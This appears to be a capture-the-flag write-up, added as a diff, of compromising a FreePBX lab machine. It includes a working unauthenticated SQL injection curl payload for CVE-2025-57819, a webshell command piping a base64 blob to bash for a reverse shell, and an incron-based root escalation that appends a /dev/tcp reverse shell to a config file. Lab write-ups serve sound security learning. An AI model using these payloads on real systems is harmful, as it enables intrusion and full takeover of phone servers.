@@ -1,0 +1,44 @@
+web to asterisk -
+
+Nmap revealed a FreePBX instance running on Apache with the hostname `connected.htb`. After adding the hostname to `/etc/hosts`, browsing to `/admin` exposed a FreePBX 16.0.40.7 login page.
+
+While enumerating the application, I identified that the Endpoint Manager module was installed. The endpoint AJAX handler was accessible without authentication:
+
+`/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model`
+
+Accessing the endpoint without the required parameters returned a verbose stack trace:
+
+`{"message":"Undefined index: template","file":"/var/www/html/admin/modules/endpoint/ajax.php"}`
+
+This confirmed that the vulnerable code path was reachable. Testing the `brand` parameter with an error-based SQL injection payload demonstrated unauthenticated SQL injection:
+
+curl -k -i "https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"
+
+The response leaked:
+
+freepbxuser@localhost
+
+Further enumeration confirmed the backend database:
+
+Database : asterisk
+MariaDB  : 5.5.65-MariaDB
+
+Researching FreePBX 16.0.40.7 led to CVE-2025-57819, an unauthenticated SQL Injection vulnerability in the Endpoint Manager module which can be chained into Remote Code Execution. Using the public watchTowr proof-of-concept, I abused the vulnerable endpoint to write a PHP webshell into the web root:
+
+/var/www/html/this-is-an-ioc-not-actually-watchTowr-rp5lmycsph.php
+
+With the webshell in place, I executed a base64-encoded reverse shell payload and received a shell as the `asterisk` user:
+
+curl -k "http://connected.htb/this-is-an-ioc-not-actually-watchTowr-rp5lmycsph.php?cmd=echo+reverseshellbase64blob+|+base64+-d+|+bash"
+
+[asterisk@connected html]$
+
+This provided the initial foothold on the machine.
+
+asterisk to root - 
+
+a freepdx machine , running on Sangoma Linux release 7.8.2003, after getting the shell I found using ps -ef --forest, incron is running as root, during enumerating the config files I found that cat /etc/incron.d/* 2>/dev/null returns /var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart and confirmed /etc/dahdi/init.conf is owned by asterisk
+
+Thus I can append echo 'bash -c "bash -i >& /dev/tcp/<IP>/9002 0>&1"' >> /etc/dahdi/init.conf and trigger the restart 
+echo trigger > /var/spool/asterisk/sysadmin/dahdi_restart and I get a reverse shell as root.
+
